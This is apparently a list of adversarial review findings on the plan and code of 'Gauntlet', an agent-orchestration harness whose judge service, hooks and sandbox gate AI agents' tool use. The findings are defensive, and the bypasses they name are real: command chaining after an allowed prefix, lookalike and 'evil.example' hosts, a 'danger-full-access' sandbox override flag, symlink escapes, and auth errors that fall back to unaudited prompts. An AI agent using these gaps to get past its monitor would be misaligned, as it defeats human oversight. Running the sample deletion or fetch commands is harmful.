context: Adversarial review of the Gauntlet phased implementation plan (runs/gauntlet/plan.md) against PRD-gauntlet.md v1.3. The plan is a phase-ordered bootstrap of an agent-orchestration harness; safety posture is fail-closed.

finding.claim: Orchestrator actions bypass the safety model: Gauntlet-owned shell steps and proposal patch application can execute commands or modify files without passing through PreToolUse hooks.
finding.evidence: P2 wires the judge only into Claude/Codex hooks, but P3 adds engine shell steps and P7 applies model-generated diffs directly.
finding.suggested_fix: Route every Gauntlet subprocess and proposal patch through a shared policy/path-containment layer, not just agent tools.

context: Adversarial review of the Gauntlet phased implementation plan (runs/gauntlet/plan.md) against PRD-gauntlet.md v1.3. The plan is a phase-ordered bootstrap of an agent-orchestration harness; safety posture is fail-closed.

finding.claim: P1 exercises real CLIs before the judge exists; adapter contract tests run real Claude/Codex calls while deliverables include write-capable modes — the riskiest moment in the bootstrap.
finding.evidence: The judge service does not arrive until P2, so nothing gates the real-agent smoke tests.
finding.suggested_fix: Constrain real-agent tests to disposable repos, read-only/no-write flags, no network, tool-less prompts; or move a minimal safety runner before real CLI smoke tests.

context: Adversarial review of the Gauntlet phased implementation plan (runs/gauntlet/plan.md) against PRD-gauntlet.md v1.3. The plan is a phase-ordered bootstrap of an agent-orchestration harness; safety posture is fail-closed.

finding.claim: Write-ahead manifests alone do not make resume safe: a killed agent_task can leave partial file edits, a half-written artifact, or an unrecorded commit, and the plan does not define the transaction boundary for external side effects.
finding.evidence: The plan tests kill -9 but defines no per-step base SHA or dirty-worktree detection.
finding.suggested_fix: Add per-step base SHA, dirty-worktree detection, partial-effect parking, and tests that die after file edits but before manifest completion.

context: Adversarial review of the Gauntlet phased implementation plan (runs/gauntlet/plan.md) against PRD-gauntlet.md v1.3. The plan is a phase-ordered bootstrap of an agent-orchestration harness; safety posture is fail-closed.

finding.claim: Permanent fail-closed hook wiring can deadlock the bootstrap: the session's hook stays wired to the judge while the engine-managed lifecycle does not arrive until P3, so a dead judge makes normal tool use impossible.
finding.evidence: P2 wires this Claude session's PreToolUse hook to the judge; if the judge is down or misconfigured there is no recovery path.
finding.suggested_fix: Define an operational model: supervised service, health-check, run-context tokens, and a human-confirmed recovery path.

context: Adversarial review of the Gauntlet phased implementation plan (runs/gauntlet/plan.md) against PRD-gauntlet.md v1.3. The plan is a phase-ordered bootstrap of an agent-orchestration harness; safety posture is fail-closed.

finding.claim: Logging redaction arrives too late: P1-P3 manual transcripts are saved under runs/gauntlet-bootstrap/manual/ but redaction is not delivered until P4, conflicting with the PRD's redact-before-writing posture.
finding.evidence: Transcripts captured in P1-P3 risk committing secrets from tool output, commands, env dumps, or audit logs.
finding.suggested_fix: Add a minimal redacting writer in P1 and use it for manual logs and judge audit from the start.

context: Adversarial review of the Gauntlet phased implementation plan (runs/gauntlet/plan.md) against PRD-gauntlet.md v1.3. The plan is a phase-ordered bootstrap of an agent-orchestration harness; safety posture is fail-closed.

finding.claim: The P4/P5 dogfooding switchover is circular: P4 says P5-P7 will execute through a Gauntlet pipeline, but P5 is where standard.yaml and the prompt set are delivered.
finding.evidence: Nothing exists at the end of P4 that could drive P5 as a pipeline.
finding.suggested_fix: Either move a minimal bootstrap pipeline/prompts into P4, or explicitly make P5 the last manual phase.

context: Adversarial review of the Gauntlet phased implementation plan (runs/gauntlet/plan.md) against PRD-gauntlet.md v1.3. The plan is a phase-ordered bootstrap of an agent-orchestration harness; safety posture is fail-closed.

finding.claim: Red-team coverage is too command-centric: the suite targets dangerous commands through CLIs while the PRD explicitly relies on sandboxing for Codex non-Bash gaps.
finding.evidence: Write/Edit path escapes, symlink escapes, credential reads, non-Bash network/file operations, package-manager variants, and shell-quoting evasions are untested.
finding.suggested_fix: Add tests for the non-command attack surfaces, including an explicit check of the codex workspace-write sandbox backstop.

context: Adversarial review of the Gauntlet phased implementation plan (runs/gauntlet/plan.md) against PRD-gauntlet.md v1.3. The plan is a phase-ordered bootstrap of an agent-orchestration harness; safety posture is fail-closed.

finding.claim: Plugin/entry-point extensibility is an unbounded code-execution surface: adapter and custom step entry points have no defined trust, allowlisting, version pinning, or doctor warnings for third-party plugins.
finding.evidence: For a safety harness, dynamic extension loading should be explicit and auditable.
finding.suggested_fix: Define plugin trust and allowlisting before exposing entry-point loading.

context: Adversarial review of the Gauntlet phased implementation plan (runs/gauntlet/plan.md) against PRD-gauntlet.md v1.3. The plan is a phase-ordered bootstrap of an agent-orchestration harness; safety posture is fail-closed.

finding.claim: Triage accuracy acceptance is too weak for blockers: >=85% aggregate agreement on ~30 bootstrap-sourced findings can hide catastrophic false negatives, especially if the sample is not stratified.
finding.evidence: A cheap model that rejects a blocking finding passes the aggregate gate.
finding.suggested_fix: Require stratification, confusion-matrix reporting, and human review or escalation for low-confidence/high-severity findings.

context: Adversarial review of the Gauntlet phased implementation plan (runs/gauntlet/plan.md) against PRD-gauntlet.md v1.3. The plan is a phase-ordered bootstrap of an agent-orchestration harness; safety posture is fail-closed.

finding.claim: Rollback needs stronger destructive-action guardrails: git reset --hard is planned with no explicit backup ref, dirty-worktree refusal, branch-divergence check, or manifest backup before rewind.
finding.evidence: A guided reset with no backups can destroy unmanifested work.
finding.suggested_fix: Add backup refs, refusal guards, and manifest snapshots before any rewind.

context: Adversarial review of the Gauntlet phased implementation plan (runs/gauntlet/plan.md) against PRD-gauntlet.md v1.3. The plan is a phase-ordered bootstrap of an agent-orchestration harness; safety posture is fail-closed.

finding.claim: It is undefined how a 'human-authored PRD' is represented technically: file existence is enforceable, authorship is not.
finding.evidence: The entry contract names a property the engine cannot check as specified.
finding.suggested_fix: Define the enforceable proxy (existence + non-stub-ness) and state that authorship is procedural.

context: Adversarial review of the Gauntlet phased implementation plan (runs/gauntlet/plan.md) against PRD-gauntlet.md v1.3. The plan is a phase-ordered bootstrap of an agent-orchestration harness; safety posture is fail-closed.

finding.claim: events.jsonl may not be safe to treat as commit-friendly by default; raw streams could be ignored unless explicitly opted in.
finding.evidence: Raw event streams are heavy and may contain content teams do not want in git.
finding.suggested_fix: Flip the default to ignore raw streams.

context: Adversarial review of the Gauntlet phased implementation plan (runs/gauntlet/plan.md) against PRD-gauntlet.md v1.3. The plan is a phase-ordered bootstrap of an agent-orchestration harness; safety posture is fail-closed.

finding.claim: The PRD has a stale line saying review fixes are 'autosquashed by default' while FR-9.4 and the plan preserve fix commits as first-class history.
finding.evidence: Two normative statements in the spec contradict each other, creating implementation ambiguity.
finding.suggested_fix: Remove the stale autosquash line from the PRD.

context: Adversarial code review of phase P1 of the Gauntlet bootstrap: agent adapters (claude/codex/LiteLLM), timeout wrapper, usage extraction, redacting writer, doctor pin file.

finding.claim: Both CLI adapters can return a successful AgentResult for a failed CLI invocation.
finding.evidence: ClaudeCodeAdapter._parse returns AgentResult from the last result event without checking out.exit_code, result_event.subtype, or result_event.is_error. CodexAdapter._parse likewise returns once it finds a final message, even if out.exit_code is non-zero. CLAUDE.md §2 requires halt on unexpected exit code, and PRD §8 requires fail-closed posture throughout.
finding.suggested_fix: Require exit_code == 0 and adapter-specific success markers before returning. Raise AdapterError or MalformedOutputError with a partial AgentResult on non-zero exit or explicit error events, and add unit tests for parseable non-zero outputs.

context: Adversarial code review of phase P1 of the Gauntlet bootstrap: agent adapters (claude/codex/LiteLLM), timeout wrapper, usage extraction, redacting writer, doctor pin file.

finding.claim: Malformed JSONL event streams are tolerated as successful raw events instead of failing closed.
finding.evidence: Both _decode_events methods catch json.JSONDecodeError and append a gauntlet.unparsed_line event; Codex has a unit test explicitly asserting this success path. The P1 plan calls for malformed-output errors, and CLAUDE.md §2 says parse errors from external calls must halt, not continue.
finding.suggested_fix: Treat any non-empty non-JSON stdout line in JSON/JSONL modes as MalformedOutputError while preserving raw stdout/stderr in the partial result. If a CLI emits known benign warnings, pin and parse that behavior explicitly instead of silently accepting arbitrary garbage.

context: Adversarial code review of phase P1 of the Gauntlet bootstrap: agent adapters (claude/codex/LiteLLM), timeout wrapper, usage extraction, redacting writer, doctor pin file.

finding.claim: The bypass lint misses Codex sandbox overrides via -c sandbox_mode="danger-full-access".
finding.evidence: BANNED_FLAG_VALUES only checks --sandbox and -s values. CodexAdapter itself uses -c sandbox_mode="..." on resume, so this is a real control path; base_flags or extra_flags can pass a later -c sandbox_mode="danger-full-access" through lint. PRD §8 and the P1 plan require permission-bypass and hook-disabling flags to be rejected at config load, not merely avoided.
finding.suggested_fix: Parse -c/--config assignments in lint_flags and reject sandbox_mode="danger-full-access" and equivalent bypass settings. Also reject duplicate sandbox overrides after the adapter has emitted its safe sandbox setting.

context: Adversarial code review of phase P1 of the Gauntlet bootstrap: agent adapters (claude/codex/LiteLLM), timeout wrapper, usage extraction, redacting writer, doctor pin file.

finding.claim: append_jsonl can leak known env-secret values that are JSON-escaped before redaction.
finding.evidence: Env-secret redaction is an exact text.count/text.replace of the raw env value. append_jsonl first json.dumps the object and only then redacts, so a secret containing a quote, backslash, or newline is serialized as an escaped string that no longer matches the raw env value. FR-4.4 and the P1 plan require values of known secret env vars to be masked before write.
finding.suggested_fix: Redact structured string values recursively before json.dumps, or add JSON-escaped variants of env secrets to the redactor. Add tests for env secrets containing quotes, backslashes, and newlines.

context: Adversarial code review of phase P1 of the Gauntlet bootstrap: agent adapters (claude/codex/LiteLLM), timeout wrapper, usage extraction, redacting writer, doctor pin file.

finding.claim: The pin file records some Codex behavior as contract-verified without a matching live contract test.
finding.evidence: pins.yaml says exec resume accepts --json, --output-schema, and -o, and says --full-auto does not exist. The live Codex resume contract test only exercises a plain resume path without schema; there is no integration assertion for resume + --output-schema, nor for --full-auto absence. The P1 plan says the pin file records the exact flags the contract tests verified.
finding.suggested_fix: Add a live contract test for resume with schema=SCHEMA, and either add a read-only help/flag assertion for --full-auto absence or remove that claim from the contract-verified section.

context: Adversarial code review of phase P2 of the Gauntlet bootstrap: FastAPI judge service, policy engine, PreToolUse hook wiring, red-team suite. Fail-closed safety posture.

finding.claim: Fast-path allow rules can be bypassed by command chaining: a command that starts with an allowed prefix is terminally allowed even if the rest of the shell line is dangerous or unclassified.
finding.evidence: `PolicyEngine` uses `p.search(command)` and treats the first allow match as terminal. Several allow regexes are only prefix-anchored, e.g. `^\s*(echo|printf)\b`, so `echo ok; python -c '<network/exfiltration>'` or `cat README.md; rm -rf src` is allowed without LLM review. This violates PRD FR-7.2 deny-first/fail-closed and FR-7.6 non-allowlisted outbound-network/bulk-deletion coverage.
finding.suggested_fix: Parse Bash commands structurally or reject/escalate any shell line containing chaining/metacharacters unless every segment is independently classified. At minimum, make allow rules full-line matches with safe argument constraints and add red-team cases for `;`, `&&`, `||`, pipes, subshells, `env`, and wrapper commands.

context: Adversarial code review of phase P2 of the Gauntlet bootstrap: FastAPI judge service, policy engine, PreToolUse hook wiring, red-team suite. Fail-closed safety posture.

finding.claim: Interactive degraded mode treats HTTP auth/server errors as “judge unreachable” and emits `ask`, allowing a misconfigured or rejected judge token to fall back to a human permission prompt with no judge audit.
finding.evidence: `urllib.error.HTTPError` is a subclass of `URLError`, and the catch block at line 85 sends every such error to the interactive `ask` path at lines 87-94. The plan only allows `unreachable -> ask` for the interactive bootstrap path; §8 requires the per-run token to reject foreign callers, and FR-7.2 requires fail-closed on errors.
finding.suggested_fix: Catch `HTTPError` separately. Treat 401/403, malformed `/decide` responses, and 5xx decision errors as `deny` with exit 2 in all modes; reserve interactive `ask` only for confirmed connection-refused/timeout liveness failures.

context: Adversarial code review of phase P2 of the Gauntlet bootstrap: FastAPI judge service, policy engine, PreToolUse hook wiring, red-team suite. Fail-closed safety posture.

finding.claim: Malformed but JSON-valid hook payloads or judge responses can crash the hook client with exit 1 instead of a fail-closed exit-2 deny.
finding.evidence: `main()` only catches `JSONDecodeError`; if stdin parses to a list, `decide_from_payload()` calls `payload.get` and raises. Likewise, if `/decide` returns a JSON list/string, `result.get` raises. The hook contract relies on exit 2 for denial, and CLAUDE.md §2 says parse errors/unexpected exit codes must fail closed.
finding.suggested_fix: Validate `payload` and `result` are dicts before use, wrap `decide_from_payload()` in a final exception guard in `main()`, and emit `deny`/exit 2 for any shape error.

context: Adversarial code review of phase P2 of the Gauntlet bootstrap: FastAPI judge service, policy engine, PreToolUse hook wiring, red-team suite. Fail-closed safety posture.

finding.claim: The outbound-network deny rule does not actually enforce the allowlist and misses common network surfaces, so non-allowlisted network can escape the deterministic deny list.
finding.evidence: The curl/wget regex uses a negative lookahead on a raw URL prefix, so hosts like `https://github.com.evil.example/...` or userinfo forms can evade the deny rule. The rule only applies to Bash curl/wget/nc/dev-tcp, while the P2 plan requires non-allowlisted outbound network coverage and non-Bash network operations; tools such as `WebFetch` or `git fetch https://evil.example/repo` are not fast-path denied and may be terminally allowed by broad git allow rules.
finding.suggested_fix: Parse URLs and compare normalized hostnames with exact/boundary allowlist semantics. Add deny/ask coverage for non-Bash network tools and for git/ssh/scp/python/perl/ruby/node network forms, with tests for prefix-host and userinfo bypasses.

context: Adversarial code review of phase P2 of the Gauntlet bootstrap: FastAPI judge service, policy engine, PreToolUse hook wiring, red-team suite. Fail-closed safety posture.

finding.claim: Structural path checks are not anchored to the supplied repo root and do not resolve symlinks, making path-escape and credential checks dependent on the judge process cwd rather than the hook context.
finding.evidence: `_resolve()` resolves relative paths against `Path.cwd()`, not `repo_root`, even though FR-7.1 requires `/decide` to use run context including repo root. `hook_client` forwards the hook payload `cwd` as `repo_root` without deriving the actual git root. The plan also required symlink escape coverage, but lexical normalization at lines 196-208 does not follow existing symlinks.
finding.suggested_fix: Pass a base directory into `_resolve()` and resolve relative paths against the hook cwd/repo root deterministically. Derive/validate the git repo root in the hook client or engine, and use `Path.resolve(strict=False)` plus explicit symlink tests for existing paths.

context: Adversarial code review of phase P2 of the Gauntlet bootstrap: FastAPI judge service, policy engine, PreToolUse hook wiring, red-team suite. Fail-closed safety posture.

finding.claim: The committed P2 artifact does not wire the repository Claude hook, so the real repo is not protected by the judge despite the P2 deliverable and exit criterion.
finding.evidence: The P2 plan requires Claude Code `PreToolUse` wiring via `.claude/settings.json` and says this session's own hook must stay wired. The commit does not add `.claude/settings.json`; the only settings file present is `.claude/settings.local.json`, and the live test creates a temporary `.claude/settings.json` fixture instead of verifying repo wiring.
finding.suggested_fix: Add the repo-level `.claude/settings.json` hook configuration for `gauntlet-judge-hook`, document the required env, and add a static/contract test that verifies the committed settings point to the hook client.

context: Adversarial code review of phase P2 of the Gauntlet bootstrap: FastAPI judge service, policy engine, PreToolUse hook wiring, red-team suite. Fail-closed safety posture.

finding.claim: The LLM classifier rung is not bounded under the hook timeout and is not wired through a `judge_llm` profile as specified.
finding.evidence: `build_core()` constructs `ApiAdapter(model=judge_model)` with the default API timeout of 120 seconds, while the hook client times out after 8 seconds. PRD FR-7.2 and the P2 plan require the LLM fallback to be bounded under CLI hook timeouts, and FR-2/plan P2 specify the `judge_llm` ApiAdapter profile rather than an ad hoc model string.
finding.suggested_fix: Introduce a judge-specific adapter/profile load path with a timeout below the hook timeout, low max tokens, deterministic temperature, and explicit failure behavior. Make the live classifier test fail if the classifier cannot return a real `llm` decision when configured.

context: Adversarial code review of phase P2 of the Gauntlet bootstrap: FastAPI judge service, policy engine, PreToolUse hook wiring, red-team suite. Fail-closed safety posture.

finding.claim: The codex sandbox tests can pass without proving that Codex actually attempted the forbidden write.
finding.evidence: The tests only assert that the target file does not exist after a natural-language prompt. If the model refuses, skips the shell action, or reports without attempting the write, the test still passes. The ratified codex decision makes the sandbox the primary safety control, so the proof needs to pin an actual sandbox denial.
finding.suggested_fix: Assert raw events/transcript evidence that Codex issued the write command and that the sandbox returned an operation-denied error, while still checking the file was not created. Keep the target outside workspace and outside system temp.

context: Adversarial code review of phase P3 of the Gauntlet bootstrap: pipeline engine (YAML loader/validation, step types, write-ahead manifest, crash resume, rollback, judge lifecycle).

finding.claim: The run-root exclusion is broader than the ratified live-run bookkeeping boundary, so real run artifacts under `runs/<slug>` are invisible to dirty checks, backups, and commits.
finding.evidence: `_exclude_pathspec()` excludes both `runs` and `runs/**`; `RunManager` sets `artifact_root=layout.slug_dir`; `agent_task` writes declared outputs to `ctx.artifact_root / output`; resume/backup/commit all pass `exclude=[self.config.run_root]`. A killed step that writes `runs/<slug>/plan.md` or another declared artifact before manifest completion will look clean versus `base_sha`, so the default `interrupted_step=park` policy silently reruns over a real partial effect. This violates the P3 transaction-boundary deliverable that dirty partial edits are detected and never silently rerun.
finding.suggested_fix: Exclude the exact live run-instance bookkeeping paths (`run_dir`, active pointer, manifest/transcripts) rather than the whole `run_root`, or move declared artifacts outside the excluded subtree. Add a crash test where a killed step leaves a partial declared output under `runs/<slug>`.

context: Adversarial code review of phase P3 of the Gauntlet bootstrap: pipeline engine (YAML loader/validation, step types, write-ahead manifest, crash resume, rollback, judge lifecycle).

finding.claim: Rollback rewinds the branch but leaves downstream non-commit step records marked done, so a later resume can skip work that `git reset --hard` removed.
finding.evidence: After resetting to the target SHA, rollback computes `dropped_step_ids` only from dropped commit records and resets only those step records. In a two-phase run, rolling back to P1 leaves P2 implementation/test records as `done` while only the P2 commit step becomes pending; resume then skips the P2 work and reaches a clean-tree commit step. FR-9.9 requires branch and manifest to never disagree.
finding.suggested_fix: Rewind all manifest step records after the target phase boundary in execution order, not just dropped commit-step IDs. Clear their base SHAs/session IDs as appropriate and set `current_step` to the first rewound step.

context: Adversarial code review of phase P3 of the Gauntlet bootstrap: pipeline engine (YAML loader/validation, step types, write-ahead manifest, crash resume, rollback, judge lifecycle).

finding.claim: Rollback accepts a branch that is ahead of the manifest, allowing unmanifested commits to be discarded by reset.
finding.evidence: The guard only rejects when `last_recorded` is not an ancestor of `HEAD`; if a human or tool made an extra commit after the manifest’s last recorded SHA, `last_recorded` is an ancestor and rollback proceeds. The P3 plan says rollback refuses if the current branch has diverged from the manifest’s recorded SHAs, and FR-9.9 requires branch/manifest agreement.
finding.suggested_fix: Require `HEAD == man.commits[-1].sha` before rollback, unless there is an explicit import/confirm flow that records or preserves the extra commits in the manifest.

context: Adversarial code review of phase P3 of the Gauntlet bootstrap: pipeline engine (YAML loader/validation, step types, write-ahead manifest, crash resume, rollback, judge lifecycle).

finding.claim: Step-level `foreach` is not resumable: completed iterations rerun, and parked gates inside foreach cannot be approved.
finding.evidence: `_run_step_foreach()` calls `_execute()` for every iteration without checking whether that iteration’s record is already `done` or `skipped`; `_execute()` then marks even a done record running again. Separately, `current_step` stores only the step id and `_find_parked_gate()` looks up `record(step_id)` with no iteration, so a parked `human_gate` record like `gate[1]` is absent to `approve`. FR-5.4 makes `foreach` first-class, and FR-8.2 requires safe resume.
finding.suggested_fix: Make `_run_step_foreach()` skip terminal iteration records, persist the current iteration in the manifest, and allow approve/reject to target a `(step_id, iteration)` gate.

context: Adversarial code review of phase P3 of the Gauntlet bootstrap: pipeline engine (YAML loader/validation, step types, write-ahead manifest, crash resume, rollback, judge lifecycle).

finding.claim: `on_fail` targets in other stages pass validation but crash at runtime when the route is taken.
finding.evidence: Validation checks `route_to` against all step IDs in the whole pipeline. Runtime builds `index` from only the current stage and `_reset_for_retry()` calls `ids.index(route_to)` on only that stage’s IDs. A cross-stage route therefore validates, then raises instead of producing a checkpointed failed/parked run. FR-5.4 requires first-class failure routing; CLAUDE.md §2 requires fail-closed behavior.
finding.suggested_fix: Either validate `on_fail.route_to` as stage-local or implement explicit cross-stage routing semantics. Add a load-time test for a cross-stage route.

context: Adversarial code review of phase P3 of the Gauntlet bootstrap: pipeline engine (YAML loader/validation, step types, write-ahead manifest, crash resume, rollback, judge lifecycle).

finding.claim: P3 declares `max_turns` and timeout guards but does not enforce them across core step paths.
finding.evidence: `max_turns` exists on steps/profiles but is never read. Profile `step_timeout_s` is stripped before adapter construction and has no fallback use. `shell` steps run `subprocess.run()` with no timeout at all; only `agent_task.timeout_s` mutates an adapter timeout. FR-3.3 and the P3 plan require per-step `max_turns`/timeout/budget guards that halt at a checkpoint.
finding.suggested_fix: Apply profile and step timeout fallbacks to every handler, use `subprocess.run(..., timeout=...)` for shell with a `HALTED` result on timeout, and either wire adapter-supported max-turn flags or reject `max_turns` on unsupported adapters at load time.

context: Adversarial code review of phase P3 of the Gauntlet bootstrap: pipeline engine (YAML loader/validation, step types, write-ahead manifest, crash resume, rollback, judge lifecycle).

finding.claim: The entry contract accepts a scaffolded PRD if the marker line is deleted.
finding.evidence: `new()` writes a fixed stub, but `check_entry_contract()` only rejects when `PRD_STUB_MARKER` is present. A user can remove that one HTML comment while leaving `# PRD: <title>`, empty sections, and scaffold text unchanged, and `run` will proceed. FR-10.1 requires a human-authored PRD; the P3 plan says `run` refuses unless `prd.md` exists and is non-stub.
finding.suggested_fix: Normalize and compare against the scaffold with and without the marker, reject placeholder headings/text, or require an explicit human-authored metadata marker separate from the scaffold body.

context: Adversarial code review of phase P3 of the Gauntlet bootstrap: pipeline engine (YAML loader/validation, step types, write-ahead manifest, crash resume, rollback, judge lifecycle).

finding.claim: Commit-message drafting omits required inputs and loses message-agent accounting.
finding.evidence: The P3 plan says the `message_agent` drafts from diff plus plan section. `_draft_commit_message()` sends only a prompt and `git diff HEAD`; `git diff HEAD` omits untracked files that `commit_all()` will add with `git add -A`, so new-file phases can be drafted from an empty diff. The successful adapter result’s usage/session ID is discarded, so manifest totals omit commit-drafting cost despite §7/FR-3.2 usage requirements.
finding.suggested_fix: Include the relevant plan excerpt and untracked-file diffs/status in the draft prompt. Accumulate message-agent usage/session IDs into the commit step record and apply the same budget/timeout guards.

context: Adversarial code review of phase P3 of the Gauntlet bootstrap: pipeline engine (YAML loader/validation, step types, write-ahead manifest, crash resume, rollback, judge lifecycle).

finding.claim: The engine-managed judge lifecycle leaks `GAUNTLET_STEP_ID` into the parent process environment.
finding.evidence: `_execute()` sets `os.environ["GAUNTLET_STEP_ID"]` for judged steps, but `ManagedJudge.stop()` only removes token, URL, mode, and run ID. BOOTSTRAP-NOTES #15 and the P3 contract describe per-run env teardown; the integration test only checks the token variable.
finding.suggested_fix: Snapshot and restore all Gauntlet judge env vars, including `GAUNTLET_STEP_ID`, in the judge lifecycle. Test that no `GAUNTLET_*` judge variables remain after success and failure.

context: Adversarial code review of phase P2 of the Gauntlet bootstrap: FastAPI judge service, policy engine, PreToolUse hook wiring, red-team suite. Fail-closed safety posture.

finding.claim: P2 ships no default running LLM-classifier profile; it is unclear whether default fail-closed without an LLM is acceptable until P3 config loading exists.
finding.evidence: The decision ladder's middle rung has no model bound in P2.
finding.suggested_fix: Ship a default classifier profile in P2.
